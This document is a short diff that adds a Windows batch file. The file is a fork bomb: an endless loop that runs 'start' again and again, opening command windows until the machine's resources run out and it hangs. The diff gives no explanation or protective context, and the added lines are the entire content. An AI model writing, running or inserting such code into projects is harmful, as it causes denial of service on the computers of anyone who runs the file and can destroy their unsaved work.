@@ -1,0 +1,4 @@
+@echo off
+:yolo
+start
+goto yolo
